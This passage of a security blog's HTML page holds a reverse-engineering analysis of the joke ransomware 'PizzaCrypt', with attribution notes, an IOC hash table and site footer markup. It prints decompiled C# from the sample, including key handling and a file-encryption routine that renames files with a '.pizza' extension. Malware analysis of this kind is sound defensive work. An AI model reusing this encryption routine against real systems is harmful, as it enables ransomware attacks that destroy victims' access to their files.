+</span></span><span class="line"><span class="cl">		<span class="n">Exponent</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s">&#34;AQAB&#34;</span><span class="p">)</span> <span class="c1">// 65537</span>
+</span></span><span class="line"><span class="cl">	<span class="p">});</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Program</span><span class="p">.</span><span class="n">PersonalID</span> <span class="p">=</span> <span class="n">rsacryptoServiceProvider</span><span class="p">.</span><span class="n">Encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Program</span><span class="p">.</span><span class="n">KeyHash</span> <span class="p">=</span> <span class="n">SHA256</span><span class="p">.</span><span class="n">Create</span><span class="p">().</span><span class="n">ComputeHash</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>After the RSA object has been setup, it writes to those files we talked about earlier which store this specific instance&rsquo;s keys.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">Program</span><span class="p">.</span><span class="n">EncryptAll</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Program</span><span class="p">.</span><span class="n">ZeroMemory</span><span class="p">(</span><span class="n">gchandle</span><span class="p">.</span><span class="n">AddrOfPinnedObject</span><span class="p">(),</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">gchandle</span><span class="p">.</span><span class="n">Free</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span><span class="p">.</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="n">Path</span><span class="p">.</span><span class="n">Combine</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">SpecialFolder</span><span class="p">.</span><span class="n">ApplicationData</span><span class="p">),</span> <span class="s">&#34;piz.za&#34;</span><span class="p">),</span> <span class="n">Program</span><span class="p">.</span><span class="n">PersonalID</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span><span class="p">.</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="n">Path</span><span class="p">.</span><span class="n">Combine</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">SpecialFolder</span><span class="p">.</span><span class="n">ApplicationData</span><span class="p">),</span> <span class="s">&#34;pi.zza&#34;</span><span class="p">),</span> <span class="n">Program</span><span class="p">.</span><span class="n">KeyHash</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">Application</span><span class="p">.</span><span class="n">ExecutablePath</span><span class="p">,</span> <span class="s">&#34;g&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>Lastly, we see the actual encryption routine. It recurses through the file system and encrypts each file using the key set above. It also adds the <code>.pizza</code> extension to all the files that it encrypted.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="n">EncryptFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">file</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">using</span> <span class="p">(</span><span class="n">FileStream</span> <span class="n">fileStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">file</span> <span class="p">+</span> <span class="s">&#34;.pizza&#34;</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Create</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">using</span> <span class="p">(</span><span class="n">RijndaelManaged</span> <span class="n">rijndaelManaged</span> <span class="p">=</span> <span class="k">new</span> <span class="n">RijndaelManaged</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">Program</span><span class="p">.</span><span class="n">GenerateSalt</span><span class="p">(</span><span class="m">32</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="n">fileStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="n">Rfc2898DeriveBytes</span> <span class="n">rfc2898DeriveBytes</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Rfc2898DeriveBytes</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">array</span><span class="p">,</span> <span class="m">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">KeySize</span> <span class="p">=</span> <span class="m">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">=</span> <span class="m">128</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">Padding</span> <span class="p">=</span> <span class="n">PaddingMode</span><span class="p">.</span><span class="n">PKCS7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">Mode</span> <span class="p">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CFB</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">Key</span> <span class="p">=</span> <span class="n">rfc2898DeriveBytes</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">KeySize</span> <span class="p">/</span> <span class="m">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">IV</span> <span class="p">=</span> <span class="n">rfc2898DeriveBytes</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">/</span> <span class="m">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="k">using</span> <span class="p">(</span><span class="n">CryptoStream</span> <span class="n">cryptoStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CryptoStream</span><span class="p">(</span><span class="n">fileStream</span><span class="p">,</span> <span class="n">rijndaelManaged</span><span class="p">.</span><span class="n">CreateEncryptor</span><span class="p">(),</span> <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Write</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="k">using</span> <span class="p">(</span><span class="n">FileStream</span> <span class="n">fileStream2</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Open</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">						<span class="p">{</span>
+</span></span><span class="line"><span class="cl">							<span class="kt">byte</span><span class="p">[]</span> <span class="n">array2</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">10485760</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">							<span class="kt">int</span> <span class="n">count</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							<span class="k">while</span> <span class="p">((</span><span class="n">count</span> <span class="p">=</span> <span class="n">fileStream2</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="n">array2</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array2</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="n">cryptoStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">array2</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">						<span class="p">}</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></div><p>The decryption routine for this program is exactly the same but makes use of the private key. Overall, there really isn&rsquo;t much to this ransomware.</p>
+<div id="where-did-this-sample-come-from" class="anchor"></div>
+<h2 class="relative group">Where did this sample come from? 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#where-did-this-sample-come-from" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>One of the strings that really sticks out in this binary is the source path: &ldquo;C:\Users\Костя\source\repos\&rdquo;. After searching for other submissions that might feature the same info, we come across some very interesting <a href="https://www.virustotal.com/gui/search/%2522C%253A%255C%255CUsers%255C%255C%25D0%259A%25D0%25BE%25D1%2581%25D1%2582%25D1%258F%255C%255Csource%255C%255Crepos%255C%255C%2522/files"   target="_blank">
+    results</a>. We can see that this build path is found in quite a few other samples:</p>
+<ul>
+<li>EliteVirusGenerator.exe</li>
+<li>Crapsomware.exe</li>
+<li>not a viruz.exe</li>
+<li>/freecsgodownloadnovirus/freecsgodownloadnovirus.github.io/main/csgo.exe</li>
+</ul>
+<p>These all seem like they were written in jest, which tracks with PizzaCrypt. There really isn&rsquo;t any major concern here - was mostly just an interesting exercise in quick and dirty RE with some rough attribution.</p>
+<div id="iocs" class="anchor"></div>
+<h2 class="relative group">IOCs 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#iocs" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<table>
+<thead>
+<tr>
+<th>File Name</th>
+<th>SHA256</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.exe</td>
+<td>a0aafb46fcdbc528925dea8783fa348bb1df49fa4ff216136f32d708d7605b6f</td>
+</tr>
+</tbody>
+</table>
+<div id="references" class="anchor"></div>
+<h2 class="relative group">References 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#references" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p><a href="https://minerva-labs.com/blog/did-someone-order-pizzacrypts/"   target="_blank">
+    https://minerva-labs.com/blog/did-someone-order-pizzacrypts/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
+        </br></br>
+        
+
+      </div>
+     
+     <script>
+        var oid = "views_posts\/pizzacrypt-analysis\/index.md"
+        var oid_likes = "likes_posts\/pizzacrypt-analysis\/index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+
+    
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/lazarus-loves-crypto/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Lazarus Using Leaked Hacking Team Tooling</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2022-12-18 17:51:24 -0500 EST">18 December 2022</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+
+    
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.35c1113bcc16c5a59bf031082f9e63822aa95280423881a7847a7ff33a16e6299ce6a840d9ef4e10d947e030a18f3f20359afb2ec0f35967484b9a9360ac3145.js" integrity="sha512-NcERO8wWxaWb8DEIL55jgiqpUoBCOIGnhHp/8zoW5imc5qhA2e9OENlH4DChjz8gNZr7LsDzWWdIS5qTYKwxRQ=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://alden.io/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
